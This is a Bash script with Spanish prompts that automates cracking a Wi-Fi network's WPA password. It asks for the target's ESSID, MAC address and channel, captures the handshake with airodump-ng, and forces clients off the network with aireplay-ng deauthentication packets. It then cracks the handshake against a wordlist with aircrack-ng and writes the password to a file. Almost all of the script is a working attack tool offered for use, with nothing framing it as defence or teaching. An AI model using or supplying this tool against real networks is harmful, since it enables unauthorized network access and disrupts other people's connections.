#!/bin/bash
# Por Hugo Vidal 2024-2025
export TERM=xterm
trap ctrl_c INT
function ctrl_c(){
	echo -e " Saliendo..."
	modo="$(iw dev $moninterface info | awk '/type/ {print $2}')"
	if [[ "$modo" == "monitor" || "$modo" == "AP" ]]; then
		ifconfig $moninterface down >/dev/null 2>&1; sleep 1
		iwconfig $moninterface mode monitor >/dev/null 2>&1; sleep 1
		ifconfig $moninterface up >/dev/null 2>&1
		airmon-ng stop $moninterface > /dev/null 2>&1
		systemctl start wpa_supplicant NetworkManager > /dev/null 2>&1
	fi
	rm -r content 2>/dev/null
	exit 0
}

##############################    datos    ########################################################

moninterface=$(/bin/cat ./content/interfaz)

function programas_wifi(){
	echo -e "\nComprobando programas necesarios...\n"
	sleep 1
	programaslist=("aircrack-ng")

	for programa in "${programaslist[@]}"; do
		if [ "$(which $programa)" ]; then
			echo ". . . . $programa esta instalado"
		else
			echo ". . . . $programa no esta instalado :("
			exit 0
		fi
	done; echo -e "\nTodo en orden :)\n"
	sleep 2; clear
}

function datos_wifi(){
	echo -ne "\n -  Ahora se va a ejecutar un comando en una ventana nueva que te mostrara la redes disponibles\n -  Cuando introduzca todos los datos cierre la ventana\n"
	sleep 1
	echo -ne "\nPresione cualquier tecla para continuar\n"
	while true; do
		read -n 1 -t 0.1 tecla && break
	done
	xterm -hold -e "airodump-ng $moninterface" &
	echo -ne "\nEspecifique el ESSID (nombre) tal cual de la red victima: " && read -r victim_essid
	echo -ne "\nDireccion MAC de la red victima: " && read -r victim_mac
	echo -ne "\nCanal de la red victima: " && read -r victim_chan
	echo -ne "\nEspecifique una wordlist para crakear la contraseña (rockyou por defecto): " && read -r wordlist
	if [ "$wordlist" == "" ]; then
		wordlist=$(locate rockyou.txt | grep -v .gz | head -n 1)
	fi
	pid=$(ps | grep xterm | awk '{print $1}')
	kill $pid > /dev/null 2>&1
	sleep 3

}

##############################    Ataque    ##########################################

function pass_attack(){
	echo -e "\n. . . . Iniciando el ataque\n"; sleep 1
	echo -e " -  Ahora se abrira otra ventana, presione cualquier tecla para continuar\n"; sleep 2
	while true; do
		read -n 1 -t 0.1 tecla && break
	done
	echo -e ". . . . Capturando el handshake"
	xterm -hold -e "airodump-ng --essid $victim_essid -c $victim_chan --write data/handshake $moninterface 2>/dev/null || airodump-ng --bssid $victim_mac -c $victim_chan --write data/handshake $moninterface" &
	sleep 3
	echo -e ". . . . Lanzando paquetes de desautenticacion"
	aireplay-ng --deauth 10 -a $victim_mac $moninterface > /dev/null 2>&1
	sleep 5
	pid=$(ps | grep xterm | awk '{print $1}')
	kill $pid > /dev/null 2>&1
	echo -e ". . . . Crackeando el handshake, esto puede llevar un buen rato"
	sleep 3
	xterm -hold -e "aircrack-ng data/handshake*.cap -w $wordlist -l password.txt; sleep 3; exit"
#	aircrack-ng content/handshake*.cap -w $wordlist > password.txt
	echo -e "\nAtaque terminado, la contraseña se ha guardado en password.txt"
	sleep 5
	ctrl_c
}

################################    Inicio del programa    #############################

clear
programas_wifi
datos_wifi
pass_attack



